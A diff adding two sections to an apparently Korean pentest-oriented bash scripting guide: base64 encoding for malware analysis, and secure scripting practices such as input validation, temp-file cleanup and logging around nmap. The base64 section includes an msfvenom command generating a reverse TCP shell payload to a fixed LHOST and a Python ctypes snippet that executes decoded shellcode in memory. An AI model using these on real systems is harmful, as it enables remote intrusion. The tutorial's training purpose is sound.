@@ -388,3 +388,162 @@ export NETWORK
 # xargs를 활용한 병렬 실행 (최대 50개 동시)
 seq 1 254 | xargs -P 50 -I {} bash -c 'scan_host "$@"' _ {}
 ```
+
+---
+
+## 6. Base64 인코딩/디코딩 (보안 분석)
+
+### 기본 사용법
+```bash
+# 인코딩
+echo -n "Hello World" | base64
+# 출력: SGVsbG8gV29ybGQ=
+
+# 디코딩
+echo "SGVsbG8gV29ybGQ=" | base64 -d
+# 출력: Hello World
+
+# 파일 인코딩
+base64 binary_file > encoded.txt
+
+# 파일 디코딩
+base64 -d encoded.txt > decoded_file
+```
+
+### 보안 분석 활용
+```bash
+# 악성코드에서 Base64 인코딩 문자열 추출 및 디코딩
+grep -oP '[A-Za-z0-9+/]{20,}={0,2}' suspicious_file.txt | \
+    while read b64; do
+        decoded=$(echo "$b64" | base64 -d 2>/dev/null)
+        if [ $? -eq 0 ]; then
+            echo "=== Decoded ==="
+            echo "$decoded"
+        fi
+    done
+
+# URL에서 Base64 추출 (URL-safe 변형 처리)
+echo "aHR0cDovL2V4YW1wbGUuY29t" | base64 -d
+# 출력: http://example.com
+
+# PowerShell 악성코드 디코딩 (EncodedCommand)
+# powershell -enc <Base64>
+echo "JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA=" | \
+    base64 -d | iconv -f UTF-16LE -t UTF-8
+
+# Python으로 Base64 처리
+python3 -c "import base64; print(base64.b64decode('SGVsbG8gV29ybGQ=').decode())"
+
+# base64 인코딩 변형 탐지
+# Standard: A-Z, a-z, 0-9, +, /
+# URL-safe:  A-Z, a-z, 0-9, -, _
+echo "SGVsbG8-V29ybGQ_" | tr '-_' '+/' | base64 -d
+```
+
+### 쉘코드 Base64 인코딩 (실습용)
+```bash
+# msfvenom으로 생성한 쉘코드 인코딩
+msfvenom -p linux/x64/shell_reverse_tcp \
+    LHOST=192.168.1.100 LPORT=4444 \
+    -f raw | base64 | tr -d '\n'
+
+# 디코딩 후 실행 (Python)
+python3 -c "
+import base64
+sc = base64.b64decode('BASE64_SHELLCODE')
+# 메모리에서 실행 (ctypes 방식)
+import ctypes
+buf = ctypes.create_string_buffer(sc)
+ctypes.cast(buf, ctypes.CFUNCTYPE(None))()
+"
+```
+
+---
+
+## 7. 스크립트 입력 검증 및 보안 코딩
+
+### 입력 검증
+```bash
+#!/bin/bash
+# 안전한 입력 검증
+
+validate_ip() {
+    local ip=$1
+    local stat=1
+    
+    if [[ $ip =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
+        OIFS=$IFS
+        IFS='.'
+        ip=($ip)
+        IFS=$OIFS
+        [[ ${ip[0]} -le 255 && ${ip[1]} -le 255 && \
+           ${ip[2]} -le 255 && ${ip[3]} -le 255 ]]
+        stat=$?
+    fi
+    return $stat
+}
+
+# IP 유효성 확인
+TARGET_IP="$1"
+if ! validate_ip "$TARGET_IP"; then
+    echo "[!] 잘못된 IP 주소: $TARGET_IP"
+    exit 1
+fi
+
+validate_port() {
+    local port=$1
+    [[ "$port" =~ ^[0-9]+$ ]] && [ "$port" -ge 1 ] && [ "$port" -le 65535 ]
+}
+```
+
+### 안전한 임시 파일 처리
+```bash
+#!/bin/bash
+# 안전한 임시 파일 생성 및 정리
+
+# mktemp으로 안전한 임시 파일 생성
+TMPFILE=$(mktemp /tmp/scan_XXXXXX.txt)
+TMPDIR=$(mktemp -d /tmp/output_XXXXXX)
+
+# 종료 시 자동 정리 (인터럽트 포함)
+cleanup() {
+    rm -f "$TMPFILE"
+    rm -rf "$TMPDIR"
+    echo "[*] 임시 파일 정리 완료"
+}
+trap cleanup EXIT INT TERM
+
+# 작업 수행
+nmap -sV TARGET_IP > "$TMPFILE"
+cp "$TMPFILE" "$TMPDIR/nmap_result.txt"
+
+echo "[+] 스캔 완료: $TMPDIR/nmap_result.txt"
+```
+
+### 로깅 기능 포함 스크립트
+```bash
+#!/bin/bash
+# 로깅이 포함된 스크립트 템플릿
+
+LOG_FILE="/var/log/pentest_$(date +%Y%m%d).log"
+TARGET="$1"
+
+log() {
+    local level=$1
+    shift
+    echo "[$(date '+%Y-%m-%d %H:%M:%S')] [$level] $*" | tee -a "$LOG_FILE"
+}
+
+log "INFO" "스크립트 시작: $0 $*"
+log "INFO" "대상 호스트: $TARGET"
+
+# 실행 예시
+if nmap -sV "$TARGET" >> "$LOG_FILE" 2>&1; then
+    log "SUCCESS" "Nmap 스캔 완료"
+else
+    log "ERROR" "Nmap 스캔 실패"
+    exit 1
+fi
+
+log "INFO" "스크립트 종료"
+```
